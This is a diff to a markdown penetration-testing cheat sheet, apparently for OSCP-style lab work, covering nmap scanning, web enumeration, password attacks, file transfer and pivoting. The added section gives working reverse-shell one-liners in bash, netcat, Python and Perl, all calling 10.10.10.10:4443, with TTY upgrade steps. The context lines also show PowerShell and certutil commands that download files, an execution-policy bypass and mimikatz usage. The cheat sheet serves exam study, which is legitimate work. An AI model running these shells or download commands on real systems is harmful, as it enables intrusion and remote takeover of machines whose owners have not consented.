@@ -49,63 +49,19 @@ The key to enumeration is patience.
 
 #### nmap
 
-TCP SYN port scan (default)
-
-`nmap 192.168.1.1 -sS` 
-
-TCP connect port scan
-
-`nmap 192.168.1.1 -sT`
-
-UDP port scan
-
-`nmap 192.168.1.1 -sU`
-
-TCP ACK port scan
-
-`nmap 192.168.1.1 -sA`
-
-Version scan
-
-`nmap 192.168.1.1 -sV`
-
-Scripts scan
-
-`nmap 192.168.1.1 -sC`
-
-OS Detection
-
-`nmap 192.168.1.1 -O`
-
-Output in all three forms
-
-`nmap 192.168.1.1 -oA out.file`
-
-Control speed/aggressiveness
-
-`nmap 192.168.1.1 -T<0-5> -min-rate <number>`
-
-Version scan, all ports, run scripts, grab OS information and output to all formats
-
-`nmamp -p- -A 192.168.1.1 -oA out.file`
-
-alternative to nmap
-
-`unicornscan`
-
-#### My scans proccess
-
 Quick Scan
 
 `nmap -sC -sV -O 10.10.10.10 -oN nmap-sV-sC-O`
 
 Full TCP Scan
 
-`nmap -vv -Pn -sS -A -sC -p- -T 3 -script-args=unsafe=1 -n 10.10.10.10 -oN nmap-full-tcp`
+`nmap -p- --min-rate 10.10.10.10 -oN nmap-full-tcp`
 
 UDP Scan
 
-`nmap -sC -sV -sU 10.10.10.10 -oN nmap-full-udp`
+`nmap -sC -sV -sU 10.10.10.10 -oN nmap-udp`
+
+Then perform further script scans against identified services as below.
 
 ---
 
@@ -172,8 +128,6 @@ Check /robots.txt, /admin, /login etc for quick wins
 `gobuster -u 10.10.10.10 -w /usr/share/wordlists/Seclists/Discovery/Web_Content/common.txt -t 80`
 
 `gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/wordlists/Seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'`: spoofing heading
-
-`wpscan -u 10.10.10.10/wp/`
 
 #### 88: Kerberos
 
@@ -375,11 +329,40 @@ Usually a webserver, often Tomcat.
 
 ## Exploitation
 
-### The Metasploit Framework
+### Reverse Shells
 
-`msfconsole`
+Bash
 
-`msfcli`
+`bash -i >& /dev/tcp/10.10.10.10/4443 0>&1`
+
+nc without -e, very reliable
+
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f`
+
+Python
+
+`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
+`perl -e 'use Socket;$i="10.10.10.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+
+#### Upgrading Reverse Shells to TTY
+
+```
+# Enter while in reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+
+Ctrl-Z
+
+# In Kali
+$ stty raw -echo
+$ fg
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
+```
 
 ### Payload Creation
 
@@ -413,11 +396,11 @@ Run windows exploits on Kali
 
 ### Password Attacks
 
-`hash-identifier`
+`hash-identifier`: identify hashes
 
-`base64 -d`
+`echo "skjgdg67dsg5d67g5sd7" | base64 -d`: decode base64
 
-`fcrackzip`
+`fcrackzip`: crack zip files
 
 #### Offline Attacks
 
@@ -522,7 +505,7 @@ While not priv esc, we can get current user credentials hash snarf via samba/htt
 
 `mimikatz`: Extract plaintexts passwords, hash, PIN code and kerberos tickets from memory, pass-the-hash, pass-the-ticket, build Golden tickets, play with certificates or private keys. Most functions require admin. Win XP-10
 
-#### Common Exploits for Windows Versions 
+#### Common Remote Exploits for Windows Versions 
  
 `MS17-010`: The reworked NSA exploits work on all unpatched versions, 32-bit and 64-bit architectures, of Windows since 2000 
 
@@ -561,7 +544,7 @@ While not priv esc, we can get current user credentials hash snarf via samba/htt
 * Windows: TFTP (up to Windows XP by default), VBScript or Powershell, also check for FTP/Webdav/etc
 * Windows: `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"`
 * Windows: 
-* Execution Powerhshell Scripts from CMD shell: `powershell -executionpolicy bypass -noninteractive -file script.ps1` 
+* Execution Powerhshell Scripts from CMD shell: `powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File script.ps1` 
 * Windows: Can use debug.exe to compile a program like nc as a last resort
 * Windows: `certutil.exe -urlcache -split -f https://myserver/filename outputfilename`
 
@@ -575,9 +558,11 @@ While not priv esc, we can get current user credentials hash snarf via samba/htt
 
 ### Pivoting
 
-`ssh forwarding`
+ssh forwarding
 
-`proxy chains`
+https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/
+
+`proxychains`
 
 `msf proxying`
 
@@ -602,3 +587,7 @@ While not priv esc, we can get current user credentials hash snarf via samba/htt
 https://xapax.gitbooks.io/security/
 
 https://github.com/codingo/Reconnoitre
+
+https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#commands
+
+
